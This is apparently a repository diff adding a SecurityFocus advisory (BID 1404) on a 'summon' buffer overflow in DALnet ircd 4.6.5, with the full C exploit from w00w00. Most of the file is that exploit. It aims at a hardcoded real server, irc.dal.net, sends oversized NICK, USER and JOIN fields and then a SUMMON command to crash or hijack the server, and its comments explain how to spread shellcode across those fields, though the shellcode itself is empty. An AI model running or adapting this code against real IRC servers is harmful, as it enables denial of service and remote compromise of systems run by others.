@@ -1,0 +1,189 @@
+source: http://www.securityfocus.com/bid/1404/info
+
+Dalnet ircd is a server for a popular internet chat application, IRC (Internet Relay Chat). The implementation for one of its features, the "summon" command, has a hole which could grant an attacker remote access on the host running the server (with the privs of the server). The vulnerability is a buffer overflow (due to use of an sprintf with user input) and rather difficult to exploit. The reason for this is that the shellcode must be divided into a number of variables, one of them being the hostname (which is obtained via reverse lookup, so dns poisoning would be involved) and then reconstructed in memory and executed on the stack. Also, the "summons" command is not enabled in the ircd server by default -- it has to be defined at compile time. Nonetheless, in theory this can be exploited so patches should be applied. 
+
+/*
+ * dalnet 4.6.5 remote exploit (without shellcode)
+ * Copyright (C) November 1999, Matt Conover & w00w00 Security Team
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define ERROR -1
+#define BUFSIZE 512
+
+#define IRCSERVER "irc.dal.net"
+#define IRCPORT 6667
+
+#define SUMMONEE "bob" /* just someone we assume will be on irc */
+
+#define NICKLEN 30
+#define USERLEN 10
+#define INFOLEN 50
+#define CHANLEN 32
+
+/*
+ * Split shellcode between nickname, username, info, and channel, with the
+ * last 4 bytes in each buffer jmp'ing to the next.  The amount of
+ * shellcode you can fit will depend on how long your hostname is.  The
+ * buffer can be overflowed by up to 65 bytes (host+channel+info+nick+user
+ * is 185 bytes, while buffer being overflowed is only 120 bytes)
+ */
+
+char shellcode[] = ""; /* see comments above */
+
+char nickname[NICKLEN+1], username[USERLEN+1];
+char info[INFOLEN+1], channel[CHANLEN+1];
+
+int sockfd;
+char readbuf[BUFSIZE], writebuf[BUFSIZE];
+
+struct sockaddr_in servsin;
+
+void exploit();
+void checkerrors();
+void makeconn();
+
+char *inet_ntoa(struct in_addr in);
+
+int main(int argc, char **argv)
+{
+   struct hostent *hostent;
+
+   hostent = gethostbyname(IRCSERVER);
+   if (hostent == NULL)
+   {
+      fprintf(stderr, "gethostbyname(%s) error: %s\n", IRCSERVER,
+              strerror(h_errno));
+
+      exit(ERROR);
+   }
+
+   servsin.sin_family = AF_INET, servsin.sin_port = htons(IRCPORT);
+   memset(&servsin.sin_zero, 0, sizeof(servsin.sin_zero));
+   memcpy(&servsin.sin_addr, hostent->h_addr, hostent->h_length);
+
+   /* setup nickname, username, and info */
+   memset(nickname, 'A', NICKLEN), nickname[NICKLEN];
+   memset(username, 'A', USERLEN), username[USERLEN];
+   memset(info, 'A', INFOLEN), info[INFOLEN];
+
+   sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+   makeconn();
+
+   printf("Calling exploit()..\n");
+   exploit(), close(sockfd);
+
+   printf("Exploitation complete.\n");
+   return 0;
+}
+
+/* connect and login to irc server */
+void makeconn()
+{
+   printf("Connecting to %s (%s) [port %d]..",
+          IRCSERVER, (char *)inet_ntoa(servsin.sin_addr), IRCPORT);
+
+   fflush(stdout);
+
+   if (connect(sockfd, (struct sockaddr *)&servsin,
+               sizeof(servsin)) == ERROR)
+   {
+      fprintf(stderr, "\nerror connecting to %s: %s\n\n",
+              IRCSERVER, strerror(errno));
+
+      close(sockfd), exit(ERROR);
+   }
+
+   printf(" connected.\n");
+
+   memset(readbuf, 0, BUFSIZE), memset(writebuf, 0, BUFSIZE);
+   snprintf(writebuf, BUFSIZE-1, "NICK %s\n", nickname);
+
+   printf("Sending NICK info..\n");
+   if (send(sockfd, writebuf, strlen(writebuf), 0) == ERROR)
+   {
+      fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
+      close(sockfd), exit(ERROR);
+   }
+
+   snprintf(writebuf, BUFSIZE-1, "USER %s none none :%s\n",
+            username, info);
+
+   printf("Sending USER info..\n");
+   if (send(sockfd, writebuf, strlen(writebuf), 0) == ERROR)
+   {
+      fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
+      close(sockfd), exit(ERROR);
+   }
+
+   printf("\nChecking for login errors..\n");
+   sleep(5), checkerrors();
+}
+
+/* check for errors in login */
+void checkerrors()
+{
+   char *ptr;
+   int res = ERROR;
+
+   while (res == BUFSIZE-1)
+   {
+      res = recv(sockfd, readbuf, BUFSIZE-1, 0);
+      if (res == ERROR)
+      {
+         fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
+         close(sockfd), exit(ERROR);
+      }
+
+      ptr = strstr(readbuf, ":ERROR");
+      if (ptr != NULL)
+      {
+         fprintf(stderr, "error with irc server:\n%s\n", ptr);
+         close(sockfd), exit(ERROR);
+      }
+   }
+}
+
+void exploit()
+{
+   printf("Successfuly logged in.\n\n");
+
+   channel[0] = '#', memset(channel+1, 'A', CHANLEN-1),
+   channel[CHANLEN] = '\0';
+
+   snprintf(writebuf, BUFSIZE-1, "JOIN %s\n", channel);
+   printf("Joining a channel..\n");
+
+   if (send(sockfd, writebuf, strlen(writebuf), 0) == ERROR)
+   {
+      fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
+      close(sockfd), exit(ERROR);
+   }
+
+   sleep(3), checkerrors();
+
+   snprintf(writebuf, BUFSIZE-1, "SUMMON %s %s\n", SUMMONEE, channel);
+   printf("\nAttempting to summon %s (the final item)..\n", SUMMONEE);
+
+   /* ircd ownage/crash will occur during this send() */
+   if (send(sockfd, writebuf, strlen(writebuf), 0) == ERROR)
+   {
+      fprintf(stderr, "error with send(): %s\n\n", strerror(errno));
+      close(sockfd), exit(ERROR);
+   }
+
+   /* should have stopped/crashed on server-side by now */
+   sleep(3), checkerrors();
+
+   printf("If it didn't work, "
+          "the server wasn't compiled with ENABLE_SUMMON\n");
+}
